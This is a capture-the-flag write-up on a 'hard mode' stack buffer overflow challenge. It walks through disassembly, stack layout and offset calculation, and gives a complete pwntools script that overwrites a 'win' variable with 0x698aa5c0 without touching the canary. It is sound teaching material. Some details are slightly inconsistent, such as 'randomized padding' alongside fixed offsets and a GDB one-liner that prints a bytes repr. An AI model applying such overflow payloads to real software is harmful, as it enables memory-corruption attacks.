# **Binary Exploitation Write-Up: Variable Control (Hard Mode)**

## **Challenge Overview**
This hard-mode challenge requires precise buffer overflow to:
1. Set `win` variable to exact value `0x698aa5c0`
2. Keep `lose` variable unchanged (zero)
3. Reverse engineer all offsets without debug output
4. Account for endianness and avoid canary corruption

## **Reverse Engineering Process**

### **1. Initial Analysis**
```bash
checksec ./challenge
```
- **No PIE**: Static addresses (good for static analysis)
- **Stack Canary**: Present but bypassable
- **NX**: Enabled (no shellcode execution)

### **2. Disassembly Findings**
Key discoveries from `objdump -d`:
```asm
lea    -0x60(%rbp),%rdx      # Buffer starts at rbp-0x60
mov    $0xb,%ecx             # Initializes 11 quadwords (88 bytes)
mov    -0xc(%rbp),%eax       # lose variable check
mov    -0x10(%rbp),%eax      # win variable check
cmp    $0x698aa5c0,%eax      # Required win value
```

### **3. Stack Layout Reconstruction**
```
+---------------------+
| Buffer Start        | rbp-0x60 (96 bytes from RBP)
| ...                 |
| win                 | rbp-0x10 (must be 0x698aa5c0)
| lose                | rbp-0xc (must remain zero)
| Canary              | rbp-0x8
| Saved RBP           | rbp
| Return Address      | rbp+0x8
+---------------------+
```

### **4. Offset Calculations**
- **Buffer to win**: `0x60 - 0x10 = 0x50` (80 bytes)
- **win to lose**: 4 bytes (`0x10 - 0xc`)
- **Total safe write**: 88 bytes (stops before canary)

## **Exploit Development**

### **1. Payload Structure**
```python
from pwn import *

payload = (
    b"A" * 80 +           # Padding to reach win
    p32(0x698aa5c0) +     # Exact win value (little-endian)
    p32(0x0)              # Explicitly keep lose=0
)
```

### **2. Complete Exploit Code**
```python
from pwn import *

# Start process
p = process("./challenge")

# Craft payload
payload = (
    b"A" * 80 +
    p32(0x698aa5c0, endian='little') +
    p32(0x0)
)

# Send and receive
p.send(payload)
print(p.recvall())
```

## **Debugging Verification**

1. **GDB Verification**:
```bash
gdb ./challenge
break *challenge+0xe3
run < <(python3 -c 'from pwn import *; print(b"A"*80 + p32(0x698aa5c0) + p32(0x0))')
x/wx $rbp-0x10  # Verify win=0x698aa5c0
x/wx $rbp-0xc   # Verify lose=0x0
```

2. **Hex Dump Check**:
```bash
python3 -c 'from pwn import *; print(hexdump(b"A"*80 + p32(0x698aa5c0) + p32(0x0)))'
```

## **Key Lessons**

1. **Precision Overflow**:
   - Exact offset calculation (80 bytes)
   - Controlled 4-byte overwrite of `win`
   - Explicit preservation of `lose`

2. **Reverse Engineering Skills**:
   - Extracting buffer size from `rep stos`
   - Identifying variable checks in disassembly
   - Calculating relative offsets

3. **Protection Bypass**:
   - Avoiding canary corruption
   - No need for memory leaks

## **Comparison: Easy vs Hard Mode**

| **Easy Version**          | **Hard Version**               |
|---------------------------|--------------------------------|
| Explicit offsets given    | Must reverse engineer offsets  |
| Debug output available    | Silent operation               |
| Fixed layout              | Randomized padding             |
| Simple payload            | Requires precise calculation   |

## **Common Pitfalls & Solutions**

| Error | Solution |
|-------|----------|
| Wrong endianness | Use `p32(value, endian='little')` |
| Accidentally modifying lose | Explicit zero-write after win |
| Newline corruption | Use `p.send()` instead of print |
| Buffer size miscalculation | Verify with GDB memory inspection |

This solution demonstrates how to:
- Transition from easy to hard challenges
- Extract necessary information from stripped binaries
- Craft precision overflow attacks
- Verify results without debug output

**Final Tip**: Always verify your payload size matches the exact distance to target variables to avoid corrupting adjacent memory.
